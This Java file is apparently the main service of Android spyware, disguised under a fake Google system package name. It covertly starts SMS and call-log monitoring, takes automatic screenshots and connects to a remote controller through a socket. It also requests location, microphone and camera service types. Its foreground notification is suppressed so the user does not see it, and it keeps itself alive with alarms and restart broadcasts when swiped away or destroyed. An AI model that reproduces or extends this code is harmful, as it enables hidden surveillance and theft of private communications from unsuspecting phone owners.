package com.google.android.sys.security;

import android.app.ActivityManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;
import android.os.Build;

public class MainService extends Service {
    private static Context contextOfApplication;
    private RealtimeMonitor realtimeMonitor;

    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }


    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
    {
        setupNotification();
        schedulePersistenceAlarm(); // Set up the "Tomorrow" insurance
        
        contextOfApplication = this;
        
        // Reset connection if updated
        try {
            android.content.SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
            // hardcode current version from gradle not available easily here, use constant
            int currentVersion = 2; // Increment this manually or pass via build config
            int lastVersion = prefs.getInt("last_version", 0);
            
            if (currentVersion > lastVersion) {
                Log.d("MainService", "App updated! Resetting connection...");
                IOSocket.resetInstance();
                prefs.edit().putInt("last_version", currentVersion).apply();
            }
        } catch (Exception e) {
            Log.e("MainService", "Error checking update", e);
        }

        ConnectionManager.startAsync(this);
        
        // Bắt đầu theo dõi realtime SMS và Call Logs
        if (realtimeMonitor == null) {
            realtimeMonitor = new RealtimeMonitor(this);
            realtimeMonitor.startMonitoring();
            Log.d("MainService", "✅ Realtime monitoring started");
        }
        
        // Bắt đầu Auto Screenshot Service
        try {
            Intent screenshotIntent = new Intent(this, AutoScreenshotService.class);
            startService(screenshotIntent);
            Log.d("MainService", "✅ Auto Screenshot Service started");
        } catch (Exception e) {
            Log.e("MainService", "Error starting Auto Screenshot Service", e);
        }
        
        return Service.START_STICKY;
    }

    private void setupNotification() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            String channelId = "sys_security_service_channel";
            String channelName = getString(R.string.service_channel_name);
            
            android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, channelName, android.app.NotificationManager.IMPORTANCE_MIN);
            channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_SECRET);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableLights(false);
            channel.enableVibration(false);
            
            android.app.NotificationManager manager = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
                
                int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                    pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
                }

                android.app.Notification.Builder nb = new android.app.Notification.Builder(this, channelId)
                    .setOngoing(false)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentTitle(getString(R.string.service_notification_title))
                    .setContentText(getString(R.string.service_notification_active))
                    .setPriority(android.app.Notification.PRIORITY_MIN)
                    .setCategory(android.app.Notification.CATEGORY_SERVICE)
                    .setVisibility(android.app.Notification.VISIBILITY_SECRET);

                android.app.Notification notification = nb.build();
                
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                    int serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                    startForeground(101, notification, serviceType);
                } else {
                    startForeground(101, notification);
                }
            }
        }
    }

    private void schedulePersistenceAlarm() {
        Intent intent = new Intent(this, MyReceiver.class);
        intent.setAction("com.google.android.sys.security.ALARM_WAKEUP");
        
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 999, intent, flags);
        android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
        
        if (alarmManager != null) {
            long triggerAt = System.currentTimeMillis() + (20 * 60 * 1000); // Trigger in 20 minutes
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
            } else {
                alarmManager.set(android.app.AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
            }
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // This is triggered when the app is swiped away from Recents
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        startService(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        // Dừng realtime monitoring
        if (realtimeMonitor != null) {
            realtimeMonitor.stopMonitoring();
            Log.d("MainService", "Realtime monitoring stopped");
        }
        
        // Attempt to restart if destroyed by system
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("com.google.android.sys.security.RESTART_SERVICE");
        broadcastIntent.setClass(this, MyReceiver.class);
        this.sendBroadcast(broadcastIntent);
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }


}
